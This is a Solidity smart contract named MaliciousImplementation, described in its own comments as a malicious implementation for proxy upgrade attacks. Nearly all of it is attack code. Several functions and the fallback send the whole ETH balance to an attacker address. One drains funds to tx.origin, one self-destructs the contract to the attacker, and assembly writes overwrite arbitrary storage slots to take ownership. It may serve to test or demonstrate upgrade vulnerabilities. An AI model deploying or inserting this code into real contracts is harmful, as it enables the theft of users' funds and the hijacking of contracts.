// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MaliciousImplementation
 * @notice Malicious implementation for proxy upgrade attacks
 */
contract MaliciousImplementation {
    address payable public attacker;
    
    constructor(address payable _attacker) {
        attacker = _attacker;
    }
    
    /**
     * @notice Drain all ETH from the contract
     */
    function drainAll() external {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");
        (bool success, ) = attacker.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Alternative drain with no requirements
     */
    function emergencyDrain() external {
        if (address(this).balance > 0) {
            payable(tx.origin).transfer(address(this).balance);
        }
    }
    
    /**
     * @notice Destroy contract and send funds to attacker
     */
    function destroy() external {
        selfdestruct(attacker);
    }
    
    /**
     * @notice Set new owner (assuming slot 0)
     */
    function setOwner(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }
    
    /**
     * @notice Generic storage overwrite
     */
    function writeStorage(uint256 slot, uint256 value) external {
        assembly {
            sstore(slot, value)
        }
    }
    
    /**
     * @notice Fallback to drain on any call
     */
    fallback() external payable {
        if (address(this).balance > 0) {
            (bool success, ) = attacker.call{value: address(this).balance}("");
        }
    }
    
    receive() external payable {}
}
